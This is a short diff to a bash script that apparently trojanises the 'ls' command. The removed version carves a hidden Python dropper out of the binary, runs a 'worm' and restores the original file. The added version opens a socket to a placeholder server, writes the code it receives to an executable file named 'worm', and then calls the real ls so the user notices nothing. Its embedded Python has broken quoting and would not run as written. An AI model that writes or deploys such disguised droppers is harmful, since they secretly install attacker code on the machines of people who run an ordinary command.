@@ -1,13 +1,30 @@
 #!/usr/bin/bash
-# dd
-dd if=/app/ls of=get_worm.py skip=253 bs=1 count=343 status=none
-python3 get_worm.py
+
+# get worm from server
+python3 - <<END
+import socket
+import time
+from os import popen
+
+HOST = "server_host"
+PORT = "server_port"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+while True:
+    outdata = "\"Virus connected"\"
+    s.send(outdata.encode())
+    indata = s.recv(1024)
+    break
+
+f = open("\"worm"\", "\"w\"")
+f.write(indata.decode())
+f.close()
+END
 
 chmod +x worm
-./worm
-
-# restore the original ls
-dd if=/app/ls of=/app/ls skip=343 bs=1 status=none
+# ./worm
 
 # call the original ls
 cmd="/usr/bin/ls"
@@ -16,5 +33,5 @@ do
     cmd="$cmd $arg"
 done
 eval $cmd
-rm -f worm get_worm.py
+# rm -f worm
 exit 0
